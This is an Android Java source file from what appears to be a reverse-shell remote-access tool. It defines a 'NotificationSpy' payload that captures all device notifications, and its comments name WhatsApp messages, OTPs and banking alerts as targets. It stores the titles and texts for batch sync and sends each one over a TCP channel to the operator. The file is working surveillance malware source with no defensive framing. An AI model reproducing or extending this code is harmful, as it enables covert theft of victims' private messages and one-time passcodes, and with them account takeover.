package com.example.reverseshell2.Payloads;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import android.util.Log;

import com.example.reverseshell2.DataStore;
import com.example.reverseshell2.mainService;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Captures ALL device notifications in real-time.
 * Now stores to local SQLite database (DataStore) for batch HTTPS sync.
 * Captures WhatsApp messages, OTPs, banking alerts, etc.
 */
public class NotificationSpy extends NotificationListenerService {

    private static final String TAG = "SYS_NOTIF";
    private DataStore store;

    @Override
    public void onCreate() {
        super.onCreate();
        store = DataStore.getInstance(this);
        Log.d(TAG, "Notification listener active");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;

            String title = "";
            String text = "";

            if (extras != null) {
                if (extras.getCharSequence(Notification.EXTRA_TITLE) != null) {
                    title = extras.getCharSequence(Notification.EXTRA_TITLE).toString();
                }
                if (extras.getCharSequence(Notification.EXTRA_TEXT) != null) {
                    text = extras.getCharSequence(Notification.EXTRA_TEXT).toString();
                }
                // Expanded notification text (e.g., full message preview)
                if (extras.getCharSequence(Notification.EXTRA_BIG_TEXT) != null) {
                    text = extras.getCharSequence(Notification.EXTRA_BIG_TEXT).toString();
                }
            }

            if (!title.isEmpty() || !text.isEmpty()) {
                // Store to local DB for batch sync
                store.insertNotification(packageName, title, text);

                // Also forward to legacy TCP if connected
                String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
                String logEntry = "[" + timestamp + "] [" + packageName + "] " + title + ": " + text;
                Log.d(TAG, logEntry);
                mainService.sendData("[NOTIF] " + logEntry + "\n");
            }
        } catch (Exception e) {
            Log.e(TAG, "Notification error: " + e.getMessage());
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Can track deleted notifications here if needed
    }
}
